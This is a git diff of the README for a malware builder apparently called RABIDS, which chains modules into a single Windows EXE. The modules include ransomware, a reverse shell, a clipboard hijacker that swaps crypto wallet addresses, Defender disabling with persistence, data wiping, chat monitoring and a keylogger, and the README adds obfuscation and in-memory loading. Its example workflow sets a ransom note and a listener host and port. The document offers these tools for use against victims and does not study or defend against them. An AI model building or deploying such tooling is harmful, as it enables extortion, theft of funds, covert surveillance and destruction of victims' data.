@@ -1,25 +1,12 @@
 ## What's New
 
 ### VERSION 0.1.3
-- **New Module: `interfaceplug/ripper`** - Clipboard wallet address ripper
+- **New Module: `daemon/gremlin`** - Clipboard wallet address hijacker
 - **Features:**
   - Monitors clipboard for copied wallet addresses (Bitcoin, Ethereum, BEP-20, Solana)
   - Automatically replaces detected wallet addresses with user-configurable predefined addresses
   - Predefined addresses for each chain can be set using the `set` command before build
-
-### VERSION 0.1.2
-- **New Module: `daemon/alt`** - Advanced keylogger with screenshot capability
-- **Features:**
-  - Stealthy keylogging triggered by '@' key press
-  - Automatic screenshot capture on trigger
-  - Hidden file storage in `.alt` folder in Downloads with random filenames
-
-### VERSION 0.1.1
-- **New Module: `daemon/chatwipe`** - WhatsApp chat extractor that automatically extracts the chats from a user's WhatsApp Web session in Google Chrome
-- **Features:**
-  - Automatically detects Chrome installation and WhatsApp Web login
-  - Extracts both incoming and outgoing messages with timestamps
-
+  
 ---
 
 ## Overview
@@ -33,53 +20,6 @@
 
 - **Modular Payloads:** Chain multiple modules (ransomware, persistence, C2, etc.) into a single EXE.
 - **Customizable Options:** Configure module and build options (e.g., ransom note, C2 port, EXE name).
-- **In-Memory Execution:** Optional Rust loader for stealthy, in-memory payload delivery.
-- **Obfuscation Support:** Optional payload obfuscation via LLVM and Rust.
-- **Cross-Platform Build:** Uses Go and Rust for robust Windows payloads.
-- **Fast Build Pipeline:** Output is saved to the `.LOOT` directory.
-
----
-
-## Installation
-
-1. **Clone the repository:**
-   ```bash
-   git clone https://github.com/sarwaaaar/RABIDS.git
-   cd RABIDS
-   ```
-2. **Install Python 3.8+**
-   ```bash
-   python3 --version
-   ```
-3. **Install system dependencies:**
-   - Go (for module compilation)
-   - Rust (for in-memory loader)
-   - **Docker** (required for payload obfuscation)
-     - Pull the required Docker image for obfuscation:
-       ```bash
-       docker pull ghcr.io/joaovarelas/obfuscator-llvm-16.0:latest
-       ```
-     - This image is used to obfuscate Rust payloads using LLVM during the build process.
-   - On macOS:
-     ```bash
-     brew install go rust
-     ```
-   - On Linux:
-     ```bash
-     sudo apt install golang rustc cargo
-     ```
-
----
-
-## Usage
-
-Start the tool:
-```bash
-python3 main.py
-```
-
-### Command Reference
-
 - `use <module>` — Add a module to the build chain
 - `set <OPTION> <VALUE>` — Set build/module options
 - `show modules` — List available modules
@@ -94,9 +34,9 @@ python3 main.py
 ### Example Workflow
 ```
 > show modules
-> use daemon/bartmoss
+> use daemon/krash
 > set NOTE "Your files have been encrypted! Contact evil@domain.com."
-> use daemon/spider
+> use daemon/flatline
 > set LHOST 192.168.1.10
 > set LPORT 4444
 > build
@@ -105,20 +45,43 @@ python3 main.py
 
 ---
 
-## Available Modules
+## Available Daemon Modules
 
-| Module                   | Description                                                        |
-|--------------------------|--------------------------------------------------------------------|
-| daemon/filedaemon        | Normal C2 server to receive data                                   |
-| daemon/spider            | Metasploit C2 server (reverse shell/payload delivery)              |
-| daemon/bartmoss          | Ransomware builder                                                 |
-| daemon/chatwipe          | WhatsApp chat extractor   |
-| daemon/alt               | Advanced keylogger with screenshot capability                      |
-| interfaceplug/blackout   | Screen blackout utility                                            |
-| interfaceplug/suicide    | Block input (DoS)                                                  |
-| interfaceplug/ripper     | Clipboard wallet address ripper (BTC, ETH, BEP-20, SOL)            |
-| quickhack/ping           | Sends back user info to the C2 server                              |
-| quickhack/icepick        | Adds EXE to persistence and adds exclusion to Windows Defender      |
+- **roadrunner**: Scans and exfiltrates system and network info
+- **hellhound**: Gains persistence and disables Defender protections
+- **gremlin**: Hijacks clipboard crypto addresses
+- **blackice**: Blacks out the screen to disrupt user activity
+- **logicbomb**: Blocks input and triggers DoS on the target
+- **flatline**: Provides a reverse shell for remote access
+- **krash**: Wipes data and crashes the system using ransomware
+- **ghost**: Hides presence and evades detection
+- **razorwire**: Implements defensive countermeasures
+- **overwatch**: Monitors all victims chats
+
+## Module Options
+
+- **roadrunner**
+    - `TARGET_IP`: Target IP address (default: 127.0.0.1)
+    - `TARGET_PORT`: Target port (default: 9000)
+- **hellhound**
+    - `PERSISTENCE`: Enable persistence (default: true)
+    - `DEFENDER_EXCLUDE`: Add Defender exclusion (default: true)
+- **gremlin**
+    - `BTC_ADDRESS`: Bitcoin address
+    - `ETH_ADDRESS`: Ethereum address
+    - `BEP20_ADDRESS`: BEP-20 address
+    - `SOL_ADDRESS`: Solana address
+- **blackice**
+    - `DURATION`: Duration of blackout in seconds (default: 60)
+- **logicbomb**
+    - `BLOCK_INPUT`: Block input (default: true)
+    - `TRIGGER_DELAY`: Delay before trigger in seconds (default: 10)
+- **flatline**
+    - `LHOST`: Local host for reverse connection (default: 0.0.0.0)
+    - `LPORT`: Local port (default: 4444)
+    - `KEY`: Encryption key (default: changeme)
+- **krash**
+    - `NOTE`: Ransom note text
 
 ---
 
